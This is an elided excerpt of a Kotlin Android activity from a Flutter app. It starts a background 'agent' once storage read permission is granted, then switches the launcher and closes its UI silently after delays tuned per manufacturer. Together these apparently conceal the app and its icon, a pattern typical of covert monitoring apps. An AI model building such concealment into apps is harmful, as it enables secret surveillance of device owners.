...
class MainActivity : FlutterActivity() {
    ...
    private val PREF_AGENT_STARTED = "agent_started"
    ...
    // handler for delayed close
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * ✅ Plain SharedPreferences (NO androidx.preference)
     */
    ...
    override fun onCreate(savedInstanceState: Bundle?) {
        ...
        // ✅ Check if already switched - if yes, close shortly (give system time to settle)
        val alreadySwitched = prefs().getBoolean(PREF_LAUNCHER_SWITCHED, false)

        if (alreadySwitched) {
            AppLogger.i(TAG, "Launcher already switched - agent running, closing shortly")
            closeSilently() // uses OEM-tuned delay
            return
        }
    ...
    override fun onResume() {
        ...
        if (prefs().getBoolean(PREF_LAUNCHER_SWITCHED, false)) {
            AppLogger.d(TAG, "Already switched - closing shortly")
            closeSilently()
            return
        }
    ...
    private fun checkAndStartAgent() {
        ...
        if (hasStorage) {
            ...
            // give system a moment before closing UI so notification/alias changes settle
            closeSilently()
        } else {
    ...
    private fun requestPermissions(result: MethodChannel.Result) {
        ...
        if (filtered.isEmpty()) {
            ...
            checkAndStartAgent()
            // ensure UI closes quietly if we started
            closeSilently()
            return
        }
    ...
    override fun onRequestPermissionsResult(
        ...
        // ✅ If READ permission granted, start agent and close shortly
        if (anyGranted && permMap["hasReadAccess"] == true) {
            ...
            // ✅ Close MainActivity shortly to let system settle
            AppLogger.i(TAG, "✅ Closing MainActivity shortly - agent running in background")
            closeSilently()
        } else {
    ...
    /**
     * Get OEM-tuned delay (ms) for closing MainActivity to make icon switch stable.
     * Samsung ~1200ms, Xiaomi/Redmi/Poco ~1500ms, Tecno/Infinix/Itel ~1700ms, others ~700ms.
     */
    private fun getManufacturerCloseDelay(): Long {
        val m = Build.MANUFACTURER.lowercase()
        return when {
            m.contains("samsung") -> 1200L
            m.contains("xiaomi") || m.contains("redmi") || m.contains("poco") -> 1500L
            m.contains("tecno") || m.contains("itel") || m.contains("infinix") -> 1700L
            else -> 700L
        }
    }

    /**
     * Close UI quietly after a short (manufacturer-tuned) delay.
     */
    private fun closeSilently(delayMs: Long? = null) {
        val finalDelay = delayMs ?: getManufacturerCloseDelay()
        try {
            mainHandler.postDelayed({
                try {
                    finish()
                } catch (e: Exception) {
                    AppLogger.e(TAG, "Failed to finish activity quietly: ${e.message}")
                }
            }, finalDelay)
        } catch (e: Exception) {
            AppLogger.e(TAG, "closeSilently failed: ${e.message}")
        }
    }
